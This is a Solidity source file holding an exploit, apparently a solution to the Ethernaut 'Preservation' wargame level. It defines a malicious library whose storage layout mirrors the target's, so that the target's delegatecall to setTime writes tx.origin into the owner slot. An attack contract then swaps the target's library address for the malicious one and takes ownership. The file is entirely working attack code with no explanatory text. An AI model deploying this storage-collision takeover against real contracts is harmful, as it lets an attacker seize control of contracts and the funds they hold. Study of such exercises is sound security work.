// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract attackPreservationLib {
    address useless1;
    address useless2;
    address owner;

    function setTime(uint256 _time) public {
        owner = tx.origin;
    }
}

contract attack {
    attackPreservationLib attackLib;
    Preservation preservation;

    constructor(address _target, address _attackLib) public {
        preservation = Preservation(_target);
        attackLib = attackPreservationLib(_attackLib);
    }

    function startAttack() public {
        preservation.setFirstTime(uint(address(attackLib)));
        preservation.setFirstTime(1);
    }
}